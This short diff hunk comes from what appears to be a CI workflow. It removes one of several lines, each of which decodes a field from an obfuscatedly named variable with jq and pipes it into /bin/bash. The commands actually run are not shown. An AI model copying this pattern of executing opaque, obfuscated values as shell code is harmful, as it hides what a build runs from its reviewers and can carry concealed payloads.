@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$a0" | jq -r .v40 | /bin/bash
           printf '%s' "$pksz3245" | jq -r .oxp4 | /bin/bash
           printf '%s' "$ed7489" | jq -r .x45 | /bin/bash
-          printf '%s' "$acaf2545" | jq -r .y72 | /bin/bash
           echo $d52281 | jq -r .w32 | /bin/bash
           printf '%s' "$o09" | jq -r .o4 | /bin/bash
           echo $gue12126 | jq -r .xasw50 | /bin/bash
